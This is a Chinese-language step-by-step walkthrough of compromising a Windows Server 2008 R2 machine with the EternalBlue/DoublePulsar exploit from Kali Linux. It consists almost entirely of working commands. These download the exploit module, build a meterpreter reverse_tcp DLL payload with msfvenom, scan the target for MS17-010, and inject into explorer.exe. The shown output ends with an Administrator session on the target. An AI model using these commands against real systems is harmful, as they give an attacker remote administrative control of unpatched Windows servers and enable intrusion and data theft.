基于kali利用Eternalblue的win服务器入侵过程
目标：cn_windows_server_2008_r2_standard_enterprise_datacenter_web_x64

```
# sudo dpkg --add-architecture i386
# apt-get update
# apt-get install winetricks
# wine --version
# apt-get install wine32

# wget -c -O Eternalblue-Doublepulsar-Metasploit.zip https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/archive/master.zip
# unzip Eternalblue-Doublepulsar-Metasploit.zip

# service postgresql start

# ifconfig
# mkdir -p /root/.wine/drive_c/
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 -f dll > /root/.wine/drive_c/eternal11.dll

# netdiscover

# msfconsole
msf > use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(smb_ms17_010) > options
msf auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.107
msf auxiliary(smb_ms17_010) > run

# cd Eternalblue-Doublepulsar-Metasploit-master/
# cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
# cd deps
# pwd

> back
> reload_all
msf exploit(eternalblue_doublepulsar) > use exploit/windows/smb/eternalblue_doublepulsar
msf exploit(eternalblue_doublepulsar) > options
msf exploit(eternalblue_doublepulsar) > set DOUBLEPULSARPATH /root/Eternalblue-Doublepulsar-Metasploit-master/deps
msf exploit(eternalblue_doublepulsar) > set ETERNALBLUEPATH /root/Eternalblue-Doublepulsar-Metasploit-master/deps
msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT explorer.exe
msf exploit(eternalblue_doublepulsar) > set RHOST 192.168.1.107
msf exploit(eternalblue_doublepulsar) > set TARGETARCHITECTURE x64
msf exploit(eternalblue_doublepulsar) > show targets
msf exploit(eternalblue_doublepulsar) > set target 7
msf exploit(eternalblue_doublepulsar) > set PAYLOAD windows/x64/meterpreter/reverse_tcp  # 32bit: set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(eternalblue_doublepulsar) > set LHOST 192.168.1.104
msf exploit(eternalblue_doublepulsar) > exploit

meterpreter > getuid
Server username: WIN-2E66MFMUV4B\Administrator
```
